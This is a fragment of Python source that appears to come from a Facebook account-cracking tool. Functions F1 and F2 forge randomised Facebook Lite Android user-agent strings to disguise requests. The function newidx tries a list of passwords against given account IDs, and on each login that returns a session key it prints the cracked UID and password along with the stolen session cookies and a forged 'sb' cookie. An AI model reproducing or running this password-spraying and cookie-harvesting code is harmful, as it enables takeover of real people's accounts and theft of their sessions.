...
def F1():
	...
	e = ";[FBAN/FB4A;FBAV/326.0.0.13276;FBBV/816144178;FBDM/{density=3.0,width=1080,height=1920};FBLC/ms_MY;FBRV/0;FBCR/Zong;FBMF/Galaxy J2 Pro Black;FBBD/Galaxy J2 Pro Black;FBPN/com.facebook.lite;FBDV/samsung;FBSV/11;FBOP/1;FBCA/x86:arm64-v8a;]"
	e = ";[FBAN/FB4A;FBAV/251.0.0.34192;FBBV/863640347;FBDM/{density=2.75,width=720,height=1600};FBLC/bn_IN;FBRV/0;FBCR/Robi;FBMF/itel a70;FBBD/itel a70;FBPN/com.facebook.lite;FBDV/infinix;FBSV/11;FBOP/1;FBCA/x64:armeabi-v7a;]"
	ua = s + e	
	return ua
...
def F2():
	...
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = "[FBAN/FB4A;FBAV/306.0.0.45331;FBBV/177948319;FBDM/{density=2.75,width=720,height=1440};FBLC/ms_MY;FBRV/0;FBCR/Telenor;FBMF/RMX2020;FBBD/RMX2020;FBPN/com.facebook.adsmanager;FBDV/realme;FBSV/8;FBOP/1;FBCA/x64:armeabi-v7a;]"
...
def newidx(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [HATDOG] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;34m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")			
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [§] Cookies :- '+cookies)
